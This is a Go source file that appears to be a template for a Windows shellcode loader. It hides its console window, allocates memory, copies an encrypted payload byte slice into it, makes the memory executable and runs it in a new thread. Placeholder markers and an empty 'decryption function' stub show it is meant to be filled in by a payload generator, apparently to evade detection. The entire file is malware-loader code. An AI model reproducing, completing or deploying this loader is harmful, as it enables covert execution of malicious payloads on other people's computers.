package main

import (
	"github.com/gonutz/ide/w32"
	"golang.org/x/sys/windows"
	"unsafe"
	//__import__
)


func closeWindows(commandShow uintptr) {
	console := w32.GetConsoleWindow()
	if console != 0 {
		_, consoleProcID := w32.GetWindowThreadProcessId(console)
		if w32.GetCurrentProcessId() == consoleProcID {
			w32.ShowWindowAsync(console, commandShow)
		}
	}
}

// 解密函数
func f() {}

func main() {
	// shellcode
	closeWindows(w32.SW_HIDE)
	//__init__
	kernel32 := windows.NewLazyDLL("kernel32.dll")
	ntdll := windows.NewLazyDLL("ntdll.dll")
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	CreateThread := kernel32.NewProc("CreateThread")
	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(byteSlice)),0x1000, 0x04)
	RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&byteSlice[0])),uintptr(len(byteSlice)))
	oldProtect := 0x04
	VirtualProtect.Call(addr, uintptr(len(byteSlice)), 0x10,uintptr(unsafe.Pointer(&oldProtect)))
	thread, _, _ := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)
	WaitForSingleObject.Call(thread, 0xFFFFFFFF)
}